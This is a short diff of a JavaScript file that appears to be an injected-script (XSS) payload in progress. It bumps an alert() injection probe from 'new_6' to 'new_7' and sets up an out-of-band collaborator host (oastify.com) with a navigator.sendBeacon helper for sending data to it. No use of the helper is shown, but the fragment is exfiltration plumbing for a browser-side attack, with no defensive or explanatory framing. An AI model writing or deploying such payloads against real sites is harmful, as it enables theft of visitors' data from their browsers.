@@ -1,4 +1,4 @@
-alert('new_6');
+alert('new_7');
 
 var A = 'https://525hz9zc5mth4kmd2lkt04psdjja77vw.oastify.com';
 var b = function(url, body) { navigator.sendBeacon(url, body || ''); };
